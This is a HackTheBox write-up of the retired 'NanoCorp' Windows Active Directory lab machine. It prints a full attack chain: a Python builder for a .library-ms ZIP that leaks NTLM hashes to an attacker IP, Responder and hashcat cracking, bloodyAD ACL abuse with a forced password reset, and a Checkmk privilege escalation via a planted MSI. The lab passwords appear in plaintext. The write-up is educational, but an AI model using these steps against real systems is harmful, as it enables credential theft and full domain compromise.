---
layout: page
title: "HTB: NanoCorp"
subtitle: "CVE-2025-24071 NTLM Leak · BloodHound ACL Abuse · CVE-2024-0670 Checkmk LPE"
permalink: /ctf/writeups/hackthebox/nanocorp/
platform: HackTheBox
machine_name: NanoCorp
difficulty: Hard
os: Windows
date: 2026-06-20
tags: [hackthebox, windows, active-directory, cve-2025-24071, library-ms, net-ntlm-v2, responder, hashcat, bloodhound, bloodyad, protected-users, kerberos, evil-winrm-py, checkmk, cve-2024-0670, msi, msiexec, qwinsta, windows-sessions, runascs, scheduled-task]
description: "Hard Windows Active Directory machine — craft a malicious ZIP to leak Net-NTLMv2, abuse BloodHound ACL chain, authenticate over Kerberos, and escalate via CVE-2024-0670 in the Checkmk monitoring agent."
---

<!-- ═══════════════════════════════════════════════════════════════════
     BOX INFO CARD  ─  standard template for all HTB writeups
══════════════════════════════════════════════════════════════════════ -->
<div class="box-info-card" style="background:linear-gradient(135deg,rgba(15,160,70,0.06) 0%,rgba(59,130,246,0.04) 100%);border:1px solid rgba(15,160,70,0.3);border-radius:14px;padding:1.5rem;margin-bottom:2rem;">

  <!-- Header row -->
  <div style="display:flex;align-items:center;gap:1rem;margin-bottom:1.25rem;flex-wrap:wrap;">
    <div style="width:52px;height:52px;background:rgba(15,160,70,0.12);border:1px solid rgba(15,160,70,0.3);border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:1.6rem;flex-shrink:0;">🖥️</div>
    <div>
      <h2 style="margin:0;font-size:1.4rem;color:var(--text-primary);">NanoCorp</h2>
      <p style="margin:0;color:var(--text-muted);font-size:0.85rem;font-family:var(--font-mono);">HackTheBox · Windows Active Directory</p>
    </div>
    <div style="margin-left:auto;">
      <span style="background:rgba(220,38,38,0.15);color:#f87171;border:1px solid rgba(220,38,38,0.35);padding:4px 12px;border-radius:6px;font-size:0.85rem;font-weight:600;">Hard</span>
    </div>
  </div>

  <!-- Info grid -->
  <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:0.6rem;margin-bottom:1.25rem;">
    <div style="background:rgba(255,255,255,0.03);border:1px solid var(--border-color);border-radius:8px;padding:0.6rem 0.75rem;">
      <div style="font-size:0.7rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:.06em;margin-bottom:2px;">IP Address</div>
      <div style="font-family:var(--font-mono);color:var(--text-primary);font-size:0.9rem;">10.129.243.199</div>
    </div>
    <div style="background:rgba(255,255,255,0.03);border:1px solid var(--border-color);border-radius:8px;padding:0.6rem 0.75rem;">
      <div style="font-size:0.7rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:.06em;margin-bottom:2px;">Domain</div>
      <div style="font-family:var(--font-mono);color:var(--text-primary);font-size:0.9rem;">nanocorp.htb</div>
    </div>
    <div style="background:rgba(255,255,255,0.03);border:1px solid var(--border-color);border-radius:8px;padding:0.6rem 0.75rem;">
      <div style="font-size:0.7rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:.06em;margin-bottom:2px;">Hostname</div>
      <div style="font-family:var(--font-mono);color:var(--text-primary);font-size:0.9rem;">DC01</div>
    </div>
    <div style="background:rgba(255,255,255,0.03);border:1px solid var(--border-color);border-radius:8px;padding:0.6rem 0.75rem;">
      <div style="font-size:0.7rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:.06em;margin-bottom:2px;">OS</div>
      <div style="color:#93c5fd;font-size:0.9rem;">Windows Server 2022</div>
    </div>
    <div style="background:rgba(255,255,255,0.03);border:1px solid var(--border-color);border-radius:8px;padding:0.6rem 0.75rem;">
      <div style="font-size:0.7rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:.06em;margin-bottom:2px;">Release</div>
      <div style="color:var(--text-primary);font-size:0.9rem;">08 Nov 2025</div>
    </div>
    <div style="background:rgba(255,255,255,0.03);border:1px solid var(--border-color);border-radius:8px;padding:0.6rem 0.75rem;">
      <div style="font-size:0.7rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:.06em;margin-bottom:2px;">Retire</div>
      <div style="color:var(--text-primary);font-size:0.9rem;">20 Jun 2026</div>
    </div>
    <div style="background:rgba(255,255,255,0.03);border:1px solid var(--border-color);border-radius:8px;padding:0.6rem 0.75rem;">
      <div style="font-size:0.7rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:.06em;margin-bottom:2px;">Creator</div>
      <div style="color:#a78bfa;font-size:0.9rem;">EmSec</div>
    </div>
    <div style="background:rgba(255,255,255,0.03);border:1px solid var(--border-color);border-radius:8px;padding:0.6rem 0.75rem;">
      <div style="font-size:0.7rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:.06em;margin-bottom:2px;">User Blood</div>
      <div style="color:#fbbf24;font-size:0.9rem;">ahos6 · 00:06:48</div>
    </div>
    <div style="background:rgba(255,255,255,0.03);border:1px solid var(--border-color);border-radius:8px;padding:0.6rem 0.75rem;">
      <div style="font-size:0.7rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:.06em;margin-bottom:2px;">Root Blood</div>
      <div style="color:#fbbf24;font-size:0.9rem;">Pyp · 00:39:48</div>
    </div>
  </div>

  <!-- Tags row -->
  <div style="display:flex;gap:6px;flex-wrap:wrap;">
    <span style="background:rgba(220,38,38,0.12);color:#f87171;border:1px solid rgba(220,38,38,0.3);padding:2px 8px;border-radius:4px;font-size:0.75rem;font-family:var(--font-mono);">CVE-2025-24071</span>
    <span style="background:rgba(220,38,38,0.12);color:#f87171;border:1px solid rgba(220,38,38,0.3);padding:2px 8px;border-radius:4px;font-size:0.75rem;font-family:var(--font-mono);">CVE-2024-0670</span>
    <span style="background:rgba(59,130,246,0.12);color:#93c5fd;border:1px solid rgba(59,130,246,0.3);padding:2px 8px;border-radius:4px;font-size:0.75rem;">Active Directory</span>
    <span style="background:rgba(124,58,237,0.12);color:#a78bfa;border:1px solid rgba(124,58,237,0.3);padding:2px 8px;border-radius:4px;font-size:0.75rem;">BloodHound</span>
    <span style="background:rgba(15,160,70,0.12);color:#4ade80;border:1px solid rgba(15,160,70,0.3);padding:2px 8px;border-radius:4px;font-size:0.75rem;">Kerberos</span>
    <span style="background:rgba(234,179,8,0.12);color:#fbbf24;border:1px solid rgba(234,179,8,0.3);padding:2px 8px;border-radius:4px;font-size:0.75rem;">Protected Users</span>
    <span style="background:rgba(15,160,70,0.12);color:#4ade80;border:1px solid rgba(15,160,70,0.3);padding:2px 8px;border-radius:4px;font-size:0.75rem;">Checkmk LPE</span>
  </div>
</div>

---

## Overview

NanoCorp is a Windows Active Directory machine built around a careers portal that accepts uploaded application archives. The attack chain:

1. **CVE-2025-24071** — Craft a malicious `.library-ms` inside a ZIP → leak `web_svc` Net-NTLMv2 via Responder when the server extracts it
2. **Crack + BloodHound** — Crack the hash, map `web_svc → IT_Support → ForceChangePassword → monitoring_svc`
3. **Kerberos shell** — `monitoring_svc` is in Protected Users; auth over Kerberos via evil-winrm-py over WinRM SSL (port 5986)
4. **CVE-2024-0670** — Checkmk agent runs as SYSTEM and processes a writable temp directory → arbitrary code execution

---

## Recon

### Initial Nmap Scan

```bash
sudo nmap -p- --reason --min-rate 10000 10.129.243.199
```

20 open TCP ports — classic Windows DC fingerprint:

```
53   domain          88   kerberos-sec    135  msrpc
139  netbios-ssn     389  ldap            445  microsoft-ds
464  kpasswd5        593  http-rpc-epmap  636  ldapssl
3268 globalcatLDAP   3269 globalcatLDAPssl
5986 wsmans  ← WinRM SSL (not the default 5985)
9389 adws
```

Version scan confirms:
- **Domain:** `nanocorp.htb` · **DC:** `DC01` · **OS:** Windows Server 2022 Build 20348
- **SSL cert** on 5986: `commonName=dc01.nanocorp.htb`
- **Clock skew:** ~7h → run `sudo ntpdate DC01.nanocorp.htb` before any Kerberos operation

### Hosts File

```bash
netexec smb 10.129.243.199 --generate-hosts-file hosts
cat hosts /etc/hosts | sudo tee /etc/hosts | head -1
# 10.129.243.199   DC01.nanocorp.htb nanocorp.htb DC01
```

### SMB / LDAP Baseline

```bash
netexec smb DC01.nanocorp.htb -u guest -p ''
# [-] STATUS_ACCOUNT_DISABLED   (no anonymous access)

netexec ldap DC01.nanocorp.htb
# signing:None          → unsigned LDAP binds accepted (relay-vulnerable)
# channel binding:none  → no EPA enforcement
```

> An unintended NTLM-relay-to-LDAP path existed and was patched ~1 week after release.

### Web — nanocorp.htb (TCP 80)

Apache/XAMPP stack (PHP 8.2.12). The "About Us" popup links to `hire.nanocorp.htb`.

```bash
echo "10.129.243.199  hire.nanocorp.htb" | sudo tee -a /etc/hosts

feroxbuster -u http://nanocorp.htb -x html,php \
  -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
# Nothing exploitable — static site only
```

### hire.nanocorp.htb — Job Application Portal

```bash
feroxbuster -u http://hire.nanocorp.htb -x php,html \
  -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
# 200  /upload.php
# 302  /success.php → index.html
```

The form accepts a ZIP archive and extracts it server-side. Renaming a text file to `.zip` fails — the server validates the archive structure.

---

## Auth as web_svc

### CVE-2025-24071 — Net-NTLMv2 Leak via .library-ms

**Background:** When Windows Explorer (or `Expand-Archive`) extracts a ZIP containing a `.library-ms` file, it automatically connects to the `<url>` embedded inside — sending NTLM credentials to the remote host.

```python
# exploit.py — build malicious ZIP
content = f"""<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\\\{attacker_ip}\\share\\</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>"""
```

```bash
uv run exploit.py -i 10.10.14.51 -f payload
# → payload.zip (contains payload.library-ms)
```

**Start Responder and upload the ZIP:**

```bash
sudo uv run Responder.py -I tun0
# (upload payload.zip via hire.nanocorp.htb form)
# Wait ~1-2 min for the automated job to extract the archive
```

**Hit received:**

```
[SMB] NTLMv2-SSP Username : NANOCORP\web_svc
[SMB] NTLMv2-SSP Hash     : web_svc::NANOCORP:99c66f06671506e5:EECF778...
```

### Crack the Hash

```bash
hashcat web_svc.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
# Mode auto-detected: 5600 (NetNTLMv2)
# Cracked: dksehdgh712!@#

netexec smb nanocorp.htb -u web_svc -p 'dksehdgh712!@#'
# [+] nanocorp.htb\web_svc:dksehdgh712!@#
```

---

## Shell as monitoring_svc

### BloodHound — ACL Enumeration

```bash
netexec ldap nanocorp.htb -u web_svc -p 'dksehdgh712!@#' \
  --dns-server 10.129.243.199 --bloodhound -c all
```

**Attack path discovered:**

```
web_svc  ──[AddMember]──▶  IT_Support  ──[ForceChangePassword]──▶  monitoring_svc
monitoring_svc  ──[Member]──▶  Remote Management Users  ──▶  WinRM Shell
```

Also found: `monitoring_svc` is in **Protected Users** → NTLM auth blocked, Kerberos required.

### Exploit the ACL Chain

```bash
# 1. Add web_svc to IT_Support
bloodyAD --host dc01.nanocorp.htb -u web_svc -p 'dksehdgh712!@#' \
  add groupMember IT_Support web_svc
# [+] web_svc added to IT_Support

# 2. Reset monitoring_svc password
bloodyAD --host dc01.nanocorp.htb -u web_svc -p 'dksehdgh712!@#' \
  set password monitoring_svc 'vulnquest.'
# [+] Password changed successfully!
```

### Kerberos Authentication (Protected Users)

NTLM fails as expected:

```bash
netexec smb DC01.nanocorp.htb -u monitoring_svc -p 'vulnquest.'
# [-] STATUS_ACCOUNT_RESTRICTION

# Sync clock first, then use -k
sudo ntpdate DC01.nanocorp.htb
netexec smb DC01.nanocorp.htb -u monitoring_svc -p 'vulnquest.' -k
# [+] nanocorp.htb\monitoring_svc:vulnquest.
```

### WinRM Shell (Port 5986 — SSL)

```bash
# Generate krb5.conf
netexec smb nanocorp.htb -u web_svc -p 'dksehdgh712!@#' \
  --generate-krb5-file krb5.conf
sudo cp krb5.conf /etc/krb5.conf

# Connect via evil-winrm-py (--ssl flag for port 5986)
evil-winrm-py -i DC01.nanocorp.htb -u monitoring_svc -p 'vulnquest.' -k --ssl
```

```powershell
evil-winrm-py PS C:\Users\monitoring_svc\Desktop> cat user.txt
b08297a9************************
```

---

## Shell as Administrator

### Enumeration

```powershell
# Non-standard programs
C:\Program Files (x86)\checkmk\   ← IT monitoring agent
C:\xampp\                          ← web server

# Port 6556 = Checkmk agent (not in original nmap — internal only)
netstat -ano | findstr 6556
# TCP  0.0.0.0:6556  LISTENING  4020
get-process | findstr 4020
# cmk-agent-ctl

# Agent data directory (monitoring_svc can write here)
C:\programdata\checkmk\agent\tmp\
```

### CVE-2024-0670 — Checkmk Agent Privilege Escalation

**Vulnerability:** The Checkmk Windows agent (running as SYSTEM) processes files from a temp directory at `C:\programdata\checkmk\agent\tmp\`. `monitoring_svc` has write access to this path. Placing a specially crafted file here causes the agent to execute it as SYSTEM.

```powershell
# Upload payload (MSI or script) to the writable tmp directory
upload payload.msi C:\programdata\checkmk\agent\tmp\payload.msi

# Agent picks up the MSI on next cycle and executes via msiexec as SYSTEM
# This grants arbitrary command execution with full system privileges
```

**Verify SYSTEM access:**

```powershell
qwinsta
# SESSIONNAME   USERNAME       ID   STATE
# console       Administrator   1   Active

# Read root flag
type C:\Users\Administrator\Desktop\root.txt
```

---

## Beyond Root — Scheduled Automations

```powershell
C:\Users\web_svc\scripts\
├── ad_cleanup.ps1      # Removes added group members and resets passwords (cleanup loop)
├── CleaningUp.ps1      # General artifact cleanup
├── script01.ps1        # Simulates admin extracting uploaded ZIPs → triggers CVE-2025-24071
└── script02.ps1        # Periodic password reset for monitoring_svc
```

**`script01.ps1`** is the key — it mimics an admin reviewing applications by extracting ZIPs from the upload directory. When `Expand-Archive` touches the `.library-ms` file, Windows sends NTLM credentials to the embedded UNC path.

---

## Credentials Summary

| Account | Credential | Method |
|---------|-----------|--------|
| `web_svc` | `dksehdgh712!@#` | Cracked from Net-NTLMv2 (Hashcat) |
| `monitoring_svc` | `vulnquest.` | ForceChangePassword via bloodyAD |
| `Administrator` | N/A (SYSTEM via CVE-2024-0670) | Checkmk agent temp dir exploit |

---

## Key Techniques

| Phase | Technique | Tool / CVE |
|-------|-----------|-----------|
| Initial access | NTLM hash leak via archive extraction | CVE-2025-24071 · Responder |
| Hash cracking | NetNTLMv2 → plaintext | Hashcat mode 5600 |
| AD enumeration | ACL path discovery | BloodHound |
| Group abuse | AddMember via write permission | bloodyAD |
| Lateral movement | ForceChangePassword on Protected Users | bloodyAD |
| Auth bypass | Kerberos instead of NTLM | netexec `-k` · evil-winrm-py |
| Privilege escalation | Checkmk agent tmp dir → SYSTEM | CVE-2024-0670 |

---

## References

- [CVE-2025-24071 — NTLM Hash Leak via .library-ms](https://www.vsociety.net/cve-2025-24071)
- [CVE-2024-0670 — Checkmk Windows Agent LPE](https://nvd.nist.gov/vuln/detail/CVE-2024-0670)
- [bloodyAD](https://github.com/CravateRouge/bloodyAD)
- [evil-winrm-py](https://github.com/Hackplayers/evil-winrm)
- [LOLBAS — msiexec](https://lolbas-project.github.io/lolbas/Binaries/Msiexec/)
- HTB: Fluffy — similar CVE-2025-24071 path via SMB share upload
